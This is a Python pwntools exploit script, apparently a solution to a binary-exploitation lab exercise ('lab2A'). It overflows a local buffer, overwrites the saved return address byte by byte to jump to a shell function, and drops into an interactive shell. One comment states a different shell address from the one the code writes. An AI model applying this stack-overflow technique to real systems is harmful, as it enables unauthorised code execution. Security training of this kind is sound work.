from pwn import *

DEBUG = False

p = process("./lab2A")
p.clean()

log.info("Exploit starting...")
log.info("Writing first word - overwriting locals.i...")
p.sendline(b"A" * 16)

log.info("Filling up cat_buf...")
for i in range(9):
    p.sendline(b"A")

if DEBUG:
    gdb.attach(p)

# overwrite padding+saved ebp
for i in range(13):
    p.sendline(b"B")

# overwrite eip - amazing, our exploit works!
# shell address is 0x80486e2, we need to write it in little endian, we can write one byte at a time
shell_addr = 0x08048703
p.sendline(b"\x03")
p.sendline(b"\x87")
p.sendline(b"\x04")
p.sendline(b"\x08")

p.sendline(b"") # exit loop
p.clean()

p.interactive()